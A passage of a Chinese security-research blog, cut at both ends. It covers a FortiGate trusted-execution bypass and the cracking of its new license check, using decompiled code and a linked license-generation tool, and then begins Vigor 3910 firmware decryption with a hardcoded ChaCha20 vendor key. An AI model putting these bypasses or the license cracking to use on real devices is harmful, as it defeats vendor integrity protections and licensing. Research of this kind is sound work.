sub_23338D0(<span class="string">&quot;Failed to enforce FortiOS Security Enforce mode\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不过实际测试发现修改此文件并不能关闭 IMA 验证，原因暂时未知。</p>
<p>继续观察 <code>fos_process_appraise_constprop_0</code>，当在缓存中找不到待验证文件的 Hash 时，代码判断这个文件是否为 <code>/data/lib/libav.so</code> 或者 <code>/data/lib/libips.so</code>，如果是二者之一，调用 <code>fos_verify_pkcs7</code> 检查文件签名。</p>
<p>如果检查失败，应该返回错误并重启系统，但这里在失败的情况下仅打印了 log 信息，函数继续向下执行并返回 0，表示验证通过。</p>
<p>&#x2F;data&#x2F;lib 目录不在访问控制的范围内，且代码对这两个文件缺乏校验，所以我们尝试自己编写程序覆盖其中之一，看看能否绕过可信执行。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_6.png"
                     
                ></p>
<p>虽然内核 log 中留下了加载非法文件的提示，但程序依然成功执行，验证了前面的分析。</p>
<h2 id="破解-License"><a href="#破解-License" class="headerlink" title="破解 License"></a>破解 License</h2><p>在之前的文章中介绍了如何生成测试版 License，新版代码修改了验证逻辑，导致以前生成的 License 无法正常使用。</p>
<p>新的验证函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">do_process_license</span><span class="params">(<span class="type">char</span> *license_data, __int64 a2, <span class="type">char</span> *lic_struct)</span></span><br><span class="line">&#123;</span><br><span class="line">  v61 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *lic_struct = <span class="number">0LL</span>;</span><br><span class="line">  *(lic_struct + <span class="number">20</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(</span><br><span class="line">    ((lic_struct + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">8LL</span> * ((lic_struct - ((lic_struct + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">168</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  *(lic_struct + <span class="number">20</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( license_data )</span><br><span class="line">  &#123;</span><br><span class="line">    license_start = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----BEGIN FGT VM LICENSE-----&quot;</span>);</span><br><span class="line">    license_end = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----END FGT VM LICENSE-----&quot;</span>);</span><br><span class="line">    license_end_1 = license_end;</span><br><span class="line">    <span class="keyword">if</span> ( license_start )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( license_end )</span><br><span class="line">      &#123;</span><br><span class="line">        license_body = license_start + <span class="number">30</span>;</span><br><span class="line">        <span class="keyword">if</span> ( license_end &gt; license_start + <span class="number">30</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = *__ctype_b_loc();</span><br><span class="line">          <span class="keyword">while</span> ( (v7[*license_body] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )<span class="comment">// 检查字符是否合法</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( license_end_1 == ++license_body )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( license_end_1 &gt; license_body )</span><br><span class="line">          &#123;</span><br><span class="line">            license_end_1_1 = license_end_1;</span><br><span class="line">            <span class="keyword">while</span> ( (v7[*license_end_1_1] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( --license_end_1_1 == license_body )</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( license_end_1_1 &gt; license_body )</span><br><span class="line">            &#123;</span><br><span class="line">              *license_end_1_1 = <span class="number">0</span>;</span><br><span class="line">              v48 = <span class="number">3</span> * ((license_end_1_1 - license_body + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">              decoded_license = <span class="built_in">malloc</span>(v48);</span><br><span class="line">              <span class="keyword">if</span> ( decoded_license )</span><br><span class="line">              &#123;</span><br><span class="line">                b64_decoded_len = base64_decode(license_body, decoded_license, v48);</span><br><span class="line">                *license_end_1_1 = <span class="number">45</span>;</span><br><span class="line">                b64_decoded_len_1 = b64_decoded_len;</span><br><span class="line">                <span class="keyword">if</span> ( !b64_decoded_len )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">                cms_start = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----BEGIN CMS-----&quot;</span>);<span class="comment">// 新增的字段</span></span><br><span class="line">                cmd_end = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----END CMS-----&quot;</span>);</span><br><span class="line">                b64_decoded_len_1_1 = b64_decoded_len_1;</span><br><span class="line">                <span class="keyword">if</span> ( cms_start &amp;&amp; cmd_end )</span><br><span class="line">                &#123;</span><br><span class="line">                  v38 = <span class="number">0LL</span>;</span><br><span class="line">                  cms_len = cmd_end + <span class="number">17</span> - cms_start;</span><br><span class="line">                  v40 = <span class="number">0LL</span>;</span><br><span class="line">                  v41 = license_end_1 + <span class="number">28</span> - license_start;</span><br><span class="line">                  <span class="keyword">if</span> ( v41 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">while</span> ( v41 != ++v40 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">while</span> ( license_start[v40] == <span class="number">10</span> &amp;&amp; license_start[v40 - <span class="number">1</span>] != <span class="number">13</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        ++v40;</span><br><span class="line">                        ++v38;</span><br><span class="line">                        <span class="keyword">if</span> ( v41 == v40 )</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">LABEL_66:</span><br><span class="line">                    v42 = v41 + v38;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v42 = <span class="number">0LL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v43 = <span class="built_in">malloc</span>(v42);</span><br><span class="line">                  b64_decoded_len_1_1 = b64_decoded_len_1;</span><br><span class="line">                  <span class="keyword">if</span> ( v43 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    sub_2DCE5F0(license_start, v41, v43, v42);</span><br><span class="line">                    ptrc = v44;</span><br><span class="line">                    v45 = do_check_cms_license(v44, v42, cms_start, cms_len);<span class="comment">// 检查 cms 内容</span></span><br><span class="line">                    <span class="built_in">free</span>(ptrc);</span><br><span class="line">                    b64_decoded_len_1_1 = b64_decoded_len_1;</span><br><span class="line">                    <span class="keyword">if</span> ( v45 == <span class="number">1</span> )</span><br><span class="line">                      lic_struct[<span class="number">162</span>] = <span class="number">1</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( b64_decoded_len_1_1 &lt;= <span class="number">0xF</span></span><br><span class="line">                  || (v13 = &amp;decoded_license[*decoded_license + <span class="number">4</span>],</span><br><span class="line">                      v46 = *decoded_license,</span><br><span class="line">                      v14 = *decoded_license,</span><br><span class="line">                      v13 &gt; &amp;decoded_license[b64_decoded_len_1_1])</span><br><span class="line">                  || (v15 = *v13, dest = v13 + <span class="number">4</span>, (v50 = decrypt_pubkey()) == <span class="number">0</span>) )<span class="comment">// 解密公钥</span></span><br><span class="line">                &#123;</span><br><span class="line">LABEL_74:</span><br><span class="line">                  v31 = <span class="number">-1</span>;</span><br><span class="line">                  <span class="built_in">free</span>(decoded_license);</span><br><span class="line">                  <span class="keyword">return</span> v31;</span><br><span class="line">                &#125;</span><br><span class="line">                v16 = EVP_PKEY_get1_RSA(v50);   <span class="comment">// 加载公钥</span></span><br><span class="line">                rsa_obj = v16;</span><br><span class="line">                <span class="keyword">if</span> ( !v16 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">                v18 = RSA_size(v16);</span><br><span class="line">                decrypted_license = <span class="built_in">calloc</span>(v18, <span class="number">1uLL</span>);</span><br><span class="line">                <span class="keyword">if</span> ( !decrypted_license )</span><br><span class="line">                &#123;</span><br><span class="line">                  v31 = <span class="number">-1</span>;</span><br><span class="line">                  RSA_free(rsa_obj);</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_60;</span><br><span class="line">                &#125;</span><br><span class="line">                decrypted_license_1 = decrypted_license;</span><br><span class="line">                v20 = RSA_public_decrypt(v14, (decoded_license + <span class="number">4</span>), decrypted_license, rsa_obj, <span class="number">1LL</span>);</span><br><span class="line">                RSA_free(rsa_obj);</span><br><span class="line">                <span class="keyword">if</span> ( v20 &gt; <span class="number">31</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v58 = _mm_loadu_si128(decrypted_license_1);</span><br><span class="line">                  v59 = _mm_loadu_si128(decrypted_license_1 + <span class="number">1</span>);</span><br><span class="line">                  <span class="built_in">free</span>(decrypted_license_1);</span><br><span class="line">                  pub_dec_len = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">free</span>(decrypted_license_1);</span><br><span class="line">                  <span class="keyword">if</span> ( v46 != <span class="number">32</span> )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">                  pub_dec_len = <span class="number">1</span>;</span><br><span class="line">                  v58 = _mm_loadu_si128((decoded_license + <span class="number">4</span>));</span><br><span class="line">                  v59 = _mm_loadu_si128((decoded_license + <span class="number">20</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                v21 = sub_2DCE270(dest, v15, &amp;v58, &amp;v58);</span><br><span class="line">                <span class="keyword">if</span> ( *(v21 + <span class="number">1</span>) == <span class="number">0x13A38693</span> ) <span class="comment">// 检查 magic</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v22 = v21[v15 - <span class="number">1</span>];</span><br><span class="line">                  v23 = v21 + <span class="number">12</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( v22 &lt; <span class="number">0x10</span>u )</span><br><span class="line">                    v15 -= v22;</span><br><span class="line">                  v24 = &amp;v21[v15];</span><br><span class="line">                  <span class="keyword">if</span> ( v23 &gt;= v24 )</span><br><span class="line">                  &#123;</span><br><span class="line">LABEL_45:</span><br><span class="line">                    v33 = *lic_struct;</span><br><span class="line">                    lic_struct[<span class="number">160</span>] = pub_dec_len;</span><br><span class="line">                    <span class="keyword">if</span> ( v33 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v34 = *(lic_struct + <span class="number">1</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v34 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v35 = check_cert(v34, v33);    <span class="comment">// 检查证书</span></span><br><span class="line">                        <span class="keyword">if</span> ( v35 == <span class="number">1</span> )</span><br><span class="line">                          lic_struct[<span class="number">161</span>] = <span class="number">1</span>;</span><br><span class="line">                        v33 = *lic_struct;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">22</span>; ++i )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v33, (&amp;vm_prefix_list)[<span class="number">2</span> * i], <span class="number">6uLL</span>) )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v31 = <span class="number">0</span>;</span><br><span class="line">                          *(lic_struct + <span class="number">20</span>) = qword_4ED4B48[<span class="number">4</span> * i];</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                      v31 = <span class="number">-1</span>;</span><br><span class="line">LABEL_54:</span><br><span class="line">                      <span class="keyword">if</span> ( !pub_dec_len || (v37 = *(lic_struct + <span class="number">20</span>), v37 == <span class="number">0x17</span>) || v37 == <span class="number">2</span> )<span class="comment">// 一定会进入，因为公钥解密得到的字节数量为 32</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( *(lic_struct + <span class="number">6</span>) )<span class="comment">// uuid</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          gen_uuid(v57);</span><br><span class="line">                          input_uuid_to_bin(*(lic_struct + <span class="number">6</span>), v60);</span><br><span class="line">                          <span class="keyword">if</span> ( check_uuid(v57, v60) )<span class="comment">// 检查 UUID</span></span><br><span class="line">                            *(lic_struct + <span class="number">20</span>) = <span class="number">1</span>;<span class="comment">// 如果赋值为 1 表示非法</span></span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        *(lic_struct + <span class="number">20</span>) = <span class="number">1</span>;</span><br><span class="line">                        v31 = <span class="number">-1</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_60;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v25 = *v23;</span><br><span class="line">                    v26 = v23 + <span class="number">1</span>;</span><br><span class="line">                    v27 = &amp;v23[v25 + <span class="number">1</span>];</span><br><span class="line">                    v28 = *(v27 + <span class="number">1</span>);</span><br><span class="line">                    v29 = (v27 + <span class="number">3</span>);</span><br><span class="line">                    v30 = *v27;</span><br><span class="line">                    v56 = <span class="number">0</span>;</span><br><span class="line">                    v23 = &amp;v27[v28 + <span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">if</span> ( v25 &lt; <span class="number">8</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span> ( (v25 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        *v60 = *v26;</span><br><span class="line">                        *(&amp;v59.m128i_i32[<span class="number">3</span>] + v25) = *(v26 + v25 - <span class="number">4</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span> <span class="keyword">if</span> ( v25 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v60[<span class="number">0</span>] = *v26;</span><br><span class="line">                        <span class="keyword">if</span> ( (v25 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">                          *(&amp;v59.m128i_i16[<span class="number">7</span>] + v25) = *(v26 + v25 - <span class="number">2</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                      v60[v25] = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">if</span> ( v30 == <span class="number">110</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">LABEL_40:</span><br><span class="line">                        <span class="keyword">if</span> ( v28 != <span class="number">4</span> )</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">                        v29 = &amp;v56;</span><br><span class="line">                        v56 = _byteswap_ulong(*(v27 + <span class="number">3</span>));</span><br><span class="line">LABEL_36:</span><br><span class="line">                        fillin_license_struct(lic_struct, v60, v30, v29, v28);</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      *(&amp;v59.m128i_i64[<span class="number">1</span>] + v25) = *(v26 + v25 - <span class="number">8</span>);</span><br><span class="line">                      qmemcpy(v60, v26, <span class="number">8</span> * ((v25 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">                      v60[v25] = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">if</span> ( v30 == <span class="number">110</span> )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( v30 == <span class="number">115</span> )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">LABEL_37:</span><br><span class="line">                    <span class="keyword">if</span> ( v24 &lt;= v23 )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">LABEL_73:</span><br><span class="line">                v31 = <span class="number">-1</span>;</span><br><span class="line">LABEL_60:</span><br><span class="line">                <span class="built_in">free</span>(decoded_license);</span><br><span class="line">                EVP_PKEY_free(v50);</span><br><span class="line">                <span class="keyword">return</span> v31;</span><br><span class="line">              &#125;</span><br><span class="line">              *license_end_1_1 = <span class="number">45</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对比旧版验证逻辑，总结变动如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 去除了单独使用 AES 算法解密 License 的代码</span><br><span class="line">2. 新增对 License 中证书的检查 (对比证书的 CN 和序列号是否相同)</span><br><span class="line">3. 新增对 UUID 的检查 (判断是否和程序计算得到的 UUID 相同)</span><br><span class="line">4. License 中新增 CMS 内容，如果检测到上传的文件包含 CMS，则对 CMS 进行检查</span><br></pre></td></tr></table></figure></div>

<p>对于第一点，代码在处理 License 时会先读取开头 4 个字节，这 4 字节表示 Header 长度，默认为 64。然后获取后续 64 字节，再用内存中解压得到的公钥进行解密，将解密结果作为 AES KEY，使用 AES 算法继续解密剩余内容。所以我们只需要获取一个合法的 License Header，并使用它对应的 AES KEY 加密 License 数据即可通过验证。</p>
<p>对于第二、三点，由于在获取 SHELL 权限时就需要对 init 程序进行修改，所以顺便把两个判断也绕过。是否包含 CMS 对 License 验证基本无影响，所以 CMS 验证暂时忽略。</p>
<p>按照上面的思路我编写了针对新版的 License 生成工具，你可以在 <a class="link"   href="https://github.com/rrrrrrri/fgt-gadgets" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 上获取。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>本文介绍了一种通过修改 FortiGate 内核与文件系统实现获取 SHELL 权限的方法，修改后无需调试内核或者关心 rootfs.gz 加解密即可启动系统。分析了新版添加的可信执行策略，并找到一种方法来绕过。分析了新版的 License 校验逻辑，并更新工具实现对新版本的破解。</p>
<p>除文中提到的以外，系统还存在其它校验逻辑，绕过方法就留给感兴趣的读者自行探索了。</p>
<p><a class="link"   href="https://jamchamb.net/2022/01/02/modify-vmlinuz-arm.html" >https://jamchamb.net/2022/01/02/modify-vmlinuz-arm.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.optistream.io/blogs/tech/fortigate-firmware-analysis" >https://www.optistream.io/blogs/tech/fortigate-firmware-analysis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://stackoverflow.com/questions/76571876/how-to-repack-vmlinux-elf-back-to-bzimage-file" >https://stackoverflow.com/questions/76571876/how-to-repack-vmlinux-elf-back-to-bzimage-file<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://reverseengineering.stackexchange.com/questions/27803/repacking-vmlinux-into-zimage-bzimage" >https://reverseengineering.stackexchange.com/questions/27803/repacking-vmlinux-into-zimage-bzimage<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/kiler129/recreate-zImage" >https://github.com/kiler129/recreate-zImage<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://elixir.bootlin.com/" >https://elixir.bootlin.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/438209486" >https://zhuanlan.zhihu.com/p/438209486<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://liwugang.github.io/2020/10/25/introduce_lsm.html" >https://liwugang.github.io/2020/10/25/introduce_lsm.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Draytek Vigor 3910</title>
    <url>/2024/02/19/vigor_3910/</url>
    <content><![CDATA[<p>Vigor 3910 相关分析</p>
<span id="more"></span>

<h2 id="Vigor-3910"><a href="#Vigor-3910" class="headerlink" title="Vigor 3910"></a>Vigor 3910</h2><p>Vigor 3910 是台湾 Draytek(居易科技)公司推出的一款四核心网关设备，提供 10G SFP+、2.5G 以太网等接口，并且支持 VPN 和防火墙功能，因此在企业场景有较多应用。</p>
<p>已经有前辈在 <a class="link"   href="https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf" >2022 年 hexacon<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 发布了针对 Vigor 3910 的相关研究，本文在此研究基础上整合相关工具并复现 CVE-2023-31447 漏洞。</p>
<h2 id="固件处理"><a href="#固件处理" class="headerlink" title="固件处理"></a>固件处理</h2><p>Draytek 提供固件<a class="link"   href="https://fw.draytek.com.tw/" >下载地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，我们下载 3.9.7.2 和 4.3.2.5 两个版本用于后续分析。</p>
<p>使用 binwalk 分析两个文件的熵值</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-1.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>Vigor 3910 v3.9.7.2</em></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-2.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>Vigor 3910 v4.3.2.5</em></td>
</tr>
</tbody></table>
<p>3.9 版本可以解析出很多特征，而 4.3 版本似乎采取了某种加密，无法直接解析。考虑固件升级策略，在 3.9 版本中可能预置了 4.3 版本的解密密钥，所以我们先分析 3.9 版本固件。</p>
<p>根据参考文章得知，固件通过 THUNDER 关键字分割为多个部分，包括两个 boot.bin，init.bin 和 ATF stage 1，先按照特征将固件拆开</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=v3910_3972.all of=boot1.bin skip=8198 count=12288 bs=16</span><br><span class="line">dd if=v3910_3972.all of=boot2.bin skip=20486 count=79552 bs=16</span><br><span class="line">dd if=v3910_3972.all of=init.bin skip=100038 count=162112 bs=16</span><br><span class="line">dd if=v3910_3972.all of=stage1.bin skip=262150 bs=16</span><br></pre></td></tr></table></figure></div>

<p>在 ATF stage 1 中可以找到 <code>BL1: Booting BL2</code> 等字符串，此为 <a class="link"   href="https://chromium.googlesource.com/external/github.com/ARM-software/arm-trusted-firmware/+/v0.4-rc1/docs/firmware-design.md" >ARM Trusted Firmware<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 相关内容，所以 3910 设备上可能使用了 ATF 技术。参考 ATF 启动流程，CPU 会先执行 BL1，BL1 通常被烧录在 ROM 中，BL1 完成初始化工作之后会通过 UUID 查找其他 BL 的位置，BL2、BL3、系统镜像等部分被单独打包在 fip.bin，存放到 flash 内。考虑到关键部分应该在 fip.bin，所以要想办法找到此文件并解包。</p>
<p>查看 ARM ATF 开源代码发现 fip.bin 是以 TOC_HEADER_NAME 和 TOC_HEADER_SERIAL_NUMBER 开头</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is used as a signature to validate the blob header */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOC_HEADER_NAME	0xAA640001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOC_HEADER_SERIAL_NUMBER 0x12345678</span></span><br><span class="line"></span><br><span class="line">toc_header = (<span class="type">fip_toc_header_t</span> *)buf;</span><br><span class="line">toc_header-&gt;name = TOC_HEADER_NAME;</span><br><span class="line">toc_header-&gt;serial_number = TOC_HEADER_SERIAL_NUMBER;</span><br><span class="line">toc_header-&gt;flags = toc_flags;</span><br></pre></td></tr></table></figure></div>

<p>从 stage1.bin 中查找这两个定义</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-3.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>fip.bin</em></td>
</tr>
</tbody></table>
<p>于是找到了 fip.bin 的起始位置，从这里开始将文件分割，得到 fip.bin (将前 8 字节删除)</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=stage1.bin of=fip.bin skip=16383 bs=16</span><br></pre></td></tr></table></figure></div>

<p>接着下载并编译 fiptool</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ARM-software/arm-trusted-firmware</span><br><span class="line"><span class="built_in">cd</span> arm-trusted-firmware</span><br><span class="line">make fiptool</span><br></pre></td></tr></table></figure></div>

<p>然后对 fip.bin 进行拆分</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">fiptool unpack ./fip.bin</span><br></pre></td></tr></table></figure></div>

<p>得到 nt-fw.bin、soc-fw.bin、tb-fw.bin 等文件，nt-fw.bin 即 BL33。</p>
<p>逆向分析此文件，其中包含 <code>Decrypt file</code>，<code>expand 32-byte k</code> 等字符串，而 <code>expand 32-byte k</code> 恰好是 salsa20 或者 chacha20 算法的标志(根据参考文章可知其实是 ChaCha20 算法)，并且在程序中能够找到密钥</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-4.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>ChaCha20 密钥</em></td>
</tr>
</tbody></table>
<p>进一步分析解密函数，它还会从加密的文件头部获取 nonce 值，由于固件不是整个都使用 ChaCha20 算法进行加密，所以还要分析其格式，找到加密的镜像以及 nonce 参数。</p>
<p>观察固件开头数据</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-5.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>v4.3.2.5 文件开头</em></td>
</tr>
</tbody></table>
<p>其中包含 env_Image、nonce 等字符串，参考 BL33 中的解密逻辑推测，此处数据结构为</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> data_length;</span><br><span class="line"><span class="type">char</span> data[data_length];</span><br></pre></td></tr></table></figure></div>

<p>所以 nonce 可以提取出来： <code>UODAjyXZOzH0</code>，加密的镜像长度也已知： <code>0x034A1A00</code></p>
<p>将 enc_Image 部分拆出，编写解密代码进行解密(去掉前 3 个字节)</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=v3910_4325.all of=enc_Image skip=15 count=3449248 bs=16</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_decrypt</span>(<span class="params">enc_Image</span>):</span><br><span class="line">    nonce = <span class="string">b&quot;UODAjyXZOzH0&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(enc_Image, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        enc_data = f.read()</span><br><span class="line">    </span><br><span class="line">    key = <span class="string">b&quot;0DraytekKd5Eason3DraytekKd5Eason&quot;</span>    <span class="comment"># J to E</span></span><br><span class="line">    cipher = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">    dec_data = cipher.decrypt(enc_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(enc_Image + <span class="string">&quot;_decrypted.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span 